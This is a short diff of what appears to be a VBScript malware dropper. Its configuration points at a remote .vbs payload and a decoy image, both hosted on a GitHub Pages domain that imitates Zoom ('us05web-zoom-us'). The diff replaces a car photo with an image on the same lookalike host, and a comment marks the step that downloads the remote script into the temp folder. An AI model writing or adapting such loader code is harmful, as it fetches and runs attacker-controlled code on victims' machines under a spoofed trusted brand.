@@ -7,7 +7,7 @@ tempFolder = objFSO.GetSpecialFolder(2)
 
 ' ---------- CONFIGURE THESE URLS ----------
 remoteVBS_URL = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/agta.vbs"
-remoteImage_URL = "https://d2ujs0u2ekt0bo.cloudfront.net/cache/width_1920/car/car-529858/photo/2021-lamborghini-aventador--svj-899950-1723099472.webp"
+remoteImage_URL = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/onikro.jpeg"
 ' ------------------------------------------
 
 ' 1. Download the remote VBS
